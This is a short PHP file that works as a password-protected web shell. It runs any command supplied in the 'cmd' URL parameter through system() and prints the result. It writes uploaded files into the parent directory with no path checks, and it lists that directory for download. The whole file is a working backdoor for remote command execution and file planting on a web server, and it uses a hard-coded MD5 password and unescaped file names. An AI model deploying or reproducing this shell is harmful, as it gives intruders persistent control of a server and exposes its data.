<?php

define('password', md5('zamani'));

function auth($password)
{
	$input_password_hash = md5($password);
	if (strcmp(password, $input_password_hash) == 0) {
		return TRUE;
	}else{
		return FALSE;
	}
}

if (isset($_GET['cmd']) && !empty($_GET['cmd']) && isset($_GET['password'])) {
	
	if (auth($_GET['password'])) {
		echo 'Command:'. system($_GET['cmd']);
        ?>
        <form method="POST" enctype="multipart/form-data">
            <p>
            Select The File to Upload:
                <input type="file" name="fileToUpload" id="fileToUpload">
                <input type="submit" value="Upload" name="submit">
            </p>
        </form>
        <?php
            if (isset($_POST['submit']) && !empty($_POST['submit'])){
                //Get the file
                $file = $_FILES['fileToUpload'];
                //Upload it to the directory
                move_uploaded_file($file["tmp_name"], "../" . $file["name"]);
                //Redirect the Folder
                header('Location: ../');
                }else{
                    echo "There is no file uploaded yet!\n\n";
                }
            ?>
            <br>You can Download these files from this directory<br>
            <?php
            $files= scandir("../");
            for($a=2; $a < count($files); $a++) {
            // Displaying The Folder that contains the files"
            // Making the file downloadable
            ?>
            <p> 
                <a download="<?php echo $files[$a] ?>" href="../<?php echo $files[$a] ?>"><?php echo $files[$a] ?></a>
            </p>
            
    <?php   
            }
        }else{
            die('Access denied, Please Enter the right Password');
        }
	}else{
        echo "Please Enter the right parameters";
    }
    ?>
<?php
?>